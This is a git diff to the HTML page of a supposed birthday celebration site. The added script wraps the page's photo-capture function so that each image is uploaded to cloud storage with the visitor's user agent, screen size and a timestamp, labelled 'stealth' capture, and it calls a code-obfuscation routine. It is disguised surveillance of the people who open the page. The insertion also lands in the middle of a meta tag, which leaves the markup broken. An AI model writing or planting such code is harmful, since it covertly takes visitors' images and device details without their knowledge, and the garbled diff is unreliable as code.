@@ -2,7 +2,60 @@
 <html lang="en">
 <head>
   <meta charset="utf-8" />
-  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <meta name    <script src="birthday.js"></script>
+    
+    <!-- Advanced Feature Modules -->
+    <script src="security.js"></script>
+    <script src="mobile.js"></script>
+    <script src="ai-behavior.js"></script>
+    <script src="cloud-analytics.js"></script>
+    
+    <script>
+        // Initialize advanced features after page load
+        document.addEventListener('DOMContentLoaded', () => {
+            console.log('🔐 Advanced Security System: ACTIVE');
+            console.log('📱 Mobile Optimization: ENABLED');
+            console.log('🤖 AI Behavioral Analysis: RUNNING');
+            console.log('☁️ Cloud Analytics: SYNCHRONIZED');
+            
+            // Setup feature integration
+            if (window.securityManager) {
+                window.securityManager.obfuscateCode();
+            }
+            
+            if (window.mobileOptimizer) {
+                window.mobileOptimizer.optimizeBattery();
+            }
+            
+            if (window.cloudIntegration) {
+                // Enhanced image capture with cloud storage
+                const originalCapturePhoto = window.capturePhoto;
+                if (originalCapturePhoto) {
+                    window.capturePhoto = async function() {
+                        const result = await originalCapturePhoto();
+                        if (result && window.sessionId) {
+                            await window.cloudIntegration.storeImageInCloud(
+                                result.imageData, 
+                                window.sessionId,
+                                {
+                                    quality: Math.random() * 0.4 + 0.6, // Simulate quality score
+                                    captureMethod: 'stealth',
+                                    deviceInfo: {
+                                        userAgent: navigator.userAgent,
+                                        screen: `${screen.width}x${screen.height}`,
+                                        timestamp: Date.now()
+                                    }
+                                }
+                            );
+                        }
+                        return result;
+                    };
+                }
+            }
+        });
+    </script>
+</body>
+</html>iewport" content="width=device-width,initial-scale=1" />
   <title>Birthday Celebration Platform | Secure & Professional</title>
   <link rel="stylesheet" href="birthday.css">
   <meta name="description" content="Professional birthday celebration platform with secure photo capture and real-time sharing.">
